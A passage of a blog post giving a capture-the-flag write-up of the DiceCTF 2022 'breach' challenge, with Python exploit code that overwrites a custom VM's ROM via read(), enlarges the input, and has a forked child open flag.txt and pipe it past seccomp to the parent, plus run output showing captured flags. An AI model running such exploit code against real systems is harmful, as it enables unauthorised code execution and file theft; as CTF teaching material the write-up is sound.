<p>This gives us the flag <code class="language-plaintext highlighter-rouge">dice{st4ying_ins1de_vms_1s_0verr4ted}</code></p>

<h2 id="exploiting-the-flag-input-for-remote-code-execution">Exploiting the flag input for remote code execution</h2>

<p>Script: <a href="https://github.com/reductor/dice-ctf-2022-breach-writeup/blob/main/exploit.py">exploit.py</a></p>

<p>This is the contaminated pwn challenge which reuses this same binary, as mentioned earlier the <code class="language-plaintext highlighter-rouge">read()</code> writes to the start of the ROM, so it’s possible to overwrite the code for after it returns from the parent code, in order to simplify writing this exploit I made use of pwninit to get working outside of Docker.</p>

<p>The <code class="language-plaintext highlighter-rouge">read()</code> only consumes <code class="language-plaintext highlighter-rouge">0x60</code> bytes, which is not really enough for us to fully exploit what we need, on top of this the location which it starts at is <code class="language-plaintext highlighter-rouge">0x28</code> so we have an option to jump around these address to try and have as much code as possible or fit it all in the <code class="language-plaintext highlighter-rouge">0x38</code> (<code class="language-plaintext highlighter-rouge">0x28-0x60</code>)</p>

<p>The first thing we need to start writing this exploit is some helpers to make it easier for crafting our own VM code</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">mov_imm</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">1</span> <span class="o">|</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">),))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">mov_reg</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">2</span><span class="p">,</span> <span class="n">r1</span> <span class="o">|</span> <span class="p">(</span><span class="n">r2</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">3</span> <span class="o">|</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">),</span> <span class="n">r1</span> <span class="o">|</span> <span class="p">(</span><span class="n">r2</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">sub</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">3</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">),</span> <span class="n">r1</span> <span class="o">|</span> <span class="p">(</span><span class="n">r2</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)))</span>
    
<span class="k">def</span> <span class="nf">mov_to_mem</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">4</span><span class="p">,</span> <span class="n">r1</span> <span class="o">|</span> <span class="p">(</span><span class="n">r2</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">mov_from_mem</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">5</span><span class="p">,</span> <span class="n">r2</span> <span class="o">|</span> <span class="p">(</span><span class="n">r1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)))</span>    

<span class="k">def</span> <span class="nf">jump_imm</span><span class="p">(</span><span class="n">imm</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">7</span><span class="p">,))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">print_reg</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">10</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>
    
<span class="k">def</span> <span class="nf">halt</span><span class="p">():</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span> <span class="p">))</span>
    
<span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">in_payload</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">in_payload</span><span class="p">)</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">2</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">2</span><span class="o">+</span><span class="mi">9</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">sub</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ret</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_to_mem</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">jump_imm</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">in_payload</span><span class="p">)</span> <span class="o">==</span> <span class="n">ret</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">call</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x2353</span><span class="p">)</span>
</code></pre></div></div>

<p>Now let’s form an initial payload to be sent, in order to keep this within the desired size instead of doing a normal call instruction and jump I make the jump instead of the return of <code class="language-plaintext highlighter-rouge">get_flag</code> and then on top of that to reduce the need for more <code class="language-plaintext highlighter-rouge">mov mem[dst], src</code> instructions which are <code class="language-plaintext highlighter-rouge">9</code> bytes I use that same value as the size which gets patched into the read from stdin into the ROM.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">initial_payload</span><span class="p">():</span>
    <span class="c1"># Patches stdin read size for the flag from:
</span>    <span class="c1"># 0x1e82: 	mov r11, 0x60
</span>    <span class="c1"># into
</span>    <span class="c1"># 0x1e82: 	mov r11, 0x1e34
</span>
    <span class="c1"># Payload to get a larger buffer
</span>    <span class="c1"># assuming r0 ix 0x8 -- it gets set to 0 from the pervious ret
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x28</span>

    <span class="c1"># Get the address of the rom
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mh">0x02020</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_from_mem</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span>

    <span class="c1"># address where the size of the read is within the parent
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x1e83</span><span class="p">)</span>   
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span>

    <span class="c1"># Setup a fake stack frame to return into 0x8
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">sub</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_to_mem</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># Setup a second stack frame to return into get_flag (0x1e34)
</span>    <span class="c1"># additionally use this as the same value to be store
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">sub</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x1e34</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_to_mem</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>

    <span class="c1"># jump to write_ptr
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">jump_imm</span><span class="p">(</span><span class="mh">0x2417</span><span class="p">)</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x60</span>
    <span class="k">return</span> <span class="n">payload</span>
</code></pre></div></div>

<p>Once this is setup we need to send it then send an empty line so that it attempts to exit the program for where this code runs, when it finally executes it will end up back in the <code class="language-plaintext highlighter-rouge">get_flag</code> loop, so won’t actually exit, but this flag will now fetch <code class="language-plaintext highlighter-rouge">0x1e34</code> bytes</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Flag'</span><span class="p">,</span> <span class="n">initial_payload</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Flag'</span><span class="p">,</span> <span class="sa">b</span><span class="s">''</span><span class="p">)</span>
</code></pre></div></div>

<p>Now that we have the ability to send a much bigger payload, you might remember the mention of seccomp earlier, the payload that it is setting up limits syscalls only to <code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">write</code>, <code class="language-plaintext highlighter-rouge">exit</code> unfortunately we need to read <code class="language-plaintext highlighter-rouge">flag.txt</code> which isn’t open so we need the ability to call <code class="language-plaintext highlighter-rouge">open</code>, thankfully the fork doesn’t have these same restrictions.</p>

<p>Additionally the child does not break out of it’s loop, so we need to modify it’s loop from <code class="language-plaintext highlighter-rouge">child_loop</code>/<code class="language-plaintext highlighter-rouge">0x40b</code> to run the code we want on the client, at the same time this same code is added to the client, so it’s one big payload used for both the parent and the child which needs to:</p>

<ol>
  <li>Get the flag on the child</li>
  <li>Send the flag from the child to the parent</li>
  <li>Receive the flag on the parent</li>
  <li>Send teh flag to stdout</li>
</ol>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">full_payload</span><span class="p">():</span>
    <span class="c1"># Starting at 8 bytes in because that's the return address
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span>
    
    <span class="c1">################
</span>    <span class="c1">#### PARENT CODE
</span>    <span class="c1">################
</span>
    <span class="c1">###
</span>    <span class="c1"># read( child, &amp;mem[0], 100 )
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># SYS_read
</span>    
    <span class="c1"># fd = child pipe
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2018</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_from_mem</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    
    <span class="c1"># buffer = &amp;mem[0x0000]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x4060</span><span class="p">)</span> <span class="c1"># &amp;mem[0x0000]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c1"># + exe base
</span>    
    <span class="c1"># count
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="c1">##
</span>    <span class="c1"># puts( &amp;mem[0] )
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># SYS_write
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># stdout
</span>    
    <span class="c1"># buffer = &amp;mem[0x0000]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x4060</span><span class="p">)</span> <span class="c1"># &amp;mem[0x0000]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c1"># + exe base
</span>
    <span class="c1"># count
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">halt</span><span class="p">()</span>
    
    <span class="c1">################
</span>    <span class="c1">#### CHILD CODE
</span>    <span class="c1">################
</span>
    <span class="n">child_start</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
    <span class="c1">###
</span>    <span class="c1"># open('flag.txt', 0, 0 )
</span>     
    <span class="c1"># store 'flag.txt\x00' in mem[0]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">'flag.txt'</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_to_mem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_to_mem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># SYS_open
</span>    
    <span class="c1"># filename = &amp;mem[0]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x4060</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span> <span class="c1"># &amp;mem[0x0000]
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c1"># + exe base
</span>    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># flags
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># mode
</span>    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
    
    <span class="c1">###
</span>    <span class="c1"># sendfile( child, flag_file, 0, 100 )
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_reg</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># in_fd
</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span> <span class="c1"># SYS_sendfile
</span>    
    <span class="c1"># out_fd = pipe
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2010</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_from_mem</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>   <span class="c1"># offset
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">mov_imm</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="c1"># size
</span>    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">halt</span><span class="p">()</span>
    
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x40b</span>
    
    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'B'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x40b</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x40b</span> <span class="c1"># child_loop
</span>    
    <span class="c1"># Jump to the start of the child code, we do this instead of putting all the child payload here
</span>    <span class="c1"># and it potentially getting too long that it ends up in two read()'s from stdin
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">jump_imm</span><span class="p">(</span><span class="n">child_start</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="n">payload</span>
</code></pre></div></div>

<p>Finally we send this payload and wait for the flag to magically appear</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Flag'</span><span class="p">,</span> <span class="n">full_payload</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Flag'</span><span class="p">,</span> <span class="sa">b</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
</code></pre></div></div>

<p>And the we get the final output</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/kali/Downloads/breach/breach_patched'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
    <span class="n">RUNPATH</span><span class="p">:</span>  <span class="sa">b</span><span class="s">'.'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">mc</span><span class="p">.</span><span class="n">ax</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">31618</span><span class="p">:</span> <span class="n">Done</span>
<span class="n">payload</span> <span class="n">length</span> <span class="mi">1044</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Receiving</span> <span class="nb">all</span> <span class="n">data</span><span class="p">:</span> <span class="n">Done</span> <span class="p">(</span><span class="mi">102</span><span class="n">B</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">mc</span><span class="p">.</span><span class="n">ax</span> <span class="n">port</span> <span class="mi">31618</span>
<span class="sa">b</span><span class="s">': dice{th4nk_y0u_for_expl0it1ng_my_3xpl0it_:)}</span><span class="se">\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>
</code></pre></div></div>

<p>It includes all the extra 0’s because we read and write 100 bytes, even though it’s not that long, but the final flag for this is <code class="language-plaintext highlighter-rouge">dice{th4nk_y0u_for_expl0it1ng_my_3xpl0it_:)}</code></p>

  </div>
<a class="u-url" href="/ctf/2022/02/21/breach-writeup.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">reductor's blog</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">
</li>
</ul>
      </div>

      <div class="footer-col footer-col-2">
<ul class="social-media-list">
<li><a href="https://github.com/reductor"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">reductor</span></a></li>
<li><a href="https://www.twitter.com/reductor"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">reductor</span></a></li>
</ul>
</div>

      <div class="footer-col footer-col-3">
        <p>This blog is (will be) primarily focused on programming and security related stuff.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
